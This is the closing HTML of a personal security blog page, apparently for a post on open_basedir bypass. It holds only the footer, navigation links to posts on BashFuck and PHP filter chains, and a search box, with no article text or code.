<a aria-label="Github" class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href="https://github.com/ML-hacker" rel="me noopener noreferrer" target="_blank"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewbox="0 0 496 512" xmlns="http://www.w3.org/2000/svg"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z" fill="currentColor"></path></svg>
</span></span></a>
</div>
</div>
</div>
</div>
<div class="mb-10"></div>
</div>
<script data-oid="views_posts\Open_basedir绕过学习.md" data-oid-likes="likes_posts\Open_basedir绕过学习.md" src="/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js" type="text/javascript"></script>
</section>
<footer class="pt-8 max-w-prose print:hidden">
<div class="pt-8">
<hr class="border-dotted border-neutral-300 dark:border-neutral-600"/>
<div class="flex justify-between pt-3">
<span>
<a class="flex group mr-3" href="/posts/%E6%B5%85%E8%B0%88bashfuck/">
<span class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400">←</span>
<span class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400">→</span>
<span class="flex flex-col">
<span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">浅谈BashFuck</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
<time datetime="2024-04-14T14:34:26+08:00">14 April 2024</time>
</span>
</span>
</a>
</span>
<span>
<a class="flex text-right group ml-3" href="/posts/filter-chain/">
<span class="flex flex-col">
<span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">Filter Chain learning</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
<time datetime="2024-04-14T14:34:26+08:00">14 April 2024</time>
</span>
</span>
<span class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400">→</span>
<span class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400">←</span>
</a>
</span>
</div>
</div>
</footer>
</article>
<div class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0 z-10" id="top-scroller">
<a aria-label="Scroll to top" class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400" href="#the-top" title="Scroll to top">
    ↑
  </a>
</div>
</main><footer class="py-10 print:hidden" id="site-footer">
<nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400 overflow-x-auto py-2">
<ul class="flex list-none flex-row">
<li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0 ltr:mr-4 rtl:ml-4">
<a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href="" title="">
</a>
</li>
</ul>
</nav>
<div class="flex items-center justify-between">
<p class="text-xs text-neutral-500 dark:text-neutral-400">
        
        
        Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://blowfish.page/" rel="noopener noreferrer" target="_blank">Blowfish</a>
</p>
</div>
<script>
      mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
        margin: 24,
        background: "rgba(0,0,0,0.5)",
        scrollOffset: 0,
      });
    </script>
<script src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js" type="text/javascript"></script>
</footer>
<div class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500" data-url="https://ml-hacker.github.io/" id="search-wrapper">
<div class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800" id="search-modal">
<header class="relative z-10 flex items-center justify-between flex-none px-2">
<form class="flex items-center flex-auto min-w-0">
<div class="flex items-center justify-center w-8 h-8 text-neutral-400">
<span class="relative block icon"><svg aria-hidden="true" class="svg-inline--fa fa-search fa-w-16" data-icon="search" data-prefix="fas" focusable="false" role="img" viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z" fill="currentColor"></path></svg>
</span>
</div>
<input class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent" id="search-query" placeholder="Search" tabindex="0" type="search"/>
</form>
<button class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" id="close-search-button" title="Close (Esc)">
<span class="relative block icon"><svg viewbox="0 0 320 512" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z" fill="currentColor"></path></svg>
</span>
</button>
</header>
<section class="flex-auto px-2 overflow-auto">
<ul id="search-results">
</ul>
</section>
</div>
</div>
</div>
</body>
</html>
